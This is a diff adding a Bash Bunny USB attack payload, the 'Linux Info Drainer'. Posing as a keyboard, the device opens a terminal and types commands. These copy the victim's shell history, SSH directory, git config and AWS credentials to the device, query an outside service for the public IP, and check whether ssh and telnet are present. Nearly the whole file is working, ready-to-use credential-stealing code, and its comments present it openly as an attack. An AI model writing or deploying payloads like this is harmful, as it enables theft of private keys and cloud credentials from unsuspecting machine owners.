@@ -1,0 +1,63 @@
+#!/bin/bash
+#
+# Title:         Linux Info Drainer
+# Author:        kmakblob (@thisisnotkmak)
+# Version:       1.2
+#
+#A payload to drain information from a linux box. Grabs bash_history, bashrc, git_config, aws creds, the ssh directory, users, ip address, ssh enabled, telnet enabled.
+# Magenta..................Setup
+# Red......................Failed to grab info
+# Green....................Attack Finished Successfully
+
+# Start Setup
+LED SETUP
+
+#Loot Directory
+lootdir=loot/LinuxDrain
+
+mkdir -p /root/udisk/$lootdir/bash_files
+mkdir -p /root/udisk/$lootdir/api_and_keys
+mkdir -p /root/udisk/$lootdir/services
+mkdir -p /root/udisk/$lootdir/other
+
+# Set Attack Mode
+ATTACKMODE HID STORAGE
+
+# Wait for Storage to mount
+sleep 3
+
+# Open a terminal
+QUACK CTRL-ALT t
+
+# Wait for terminal to open
+QUACK DELAY 300
+
+# Grab the info!
+
+#Props to the tuzzmaniandevil for this nice 1 liner!
+GetBunny="$(readlink -f /dev/disk/by-label/BashBunny | while read -r dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)"
+
+#Get Files
+Q STRING "cp ~/.bash_history $GetBunny/$lootdir/bash_files"
+Q STRING "cp -r ~/.ssh $GetBunny/$lootdir/api_and_keys"
+Q STRING "cp ~/.git_config $GetBunny/$lootdir/api_and_keys"
+Q STRING "cp ~/.aws/credentials $GetBunny/$lootdir/api_and_keys"
+
+#Get other info
+Q STRING "echo \$(wget -qO- http://ipecho.net/plain ; echo) > $GetBunny/$lootdir/other/ip.txt"
+Q STRING "echo \$(sshd -v 2>&1) > $GetBunny/$lootdir/services/ssh.txt"
+Q STRING "echo \$(ps -aux | grep telnet 2>&1) > $GetBunny/$lootdir/services/telnet.txt"
+
+Q ENTER
+
+# We are done. "QUICK unplug the bunny! Security is coming."
+LED CLEANUP
+Q STRING exit
+Q ENTER
+
+
+if [ "$(find "$GetBunny/$lootdir" -type d -empty 2>/dev/null)" ]; then
+    LED RED #No files in the loot dir, we got nothing
+else
+    LED FINISH #Yeeaah we got something
+fi
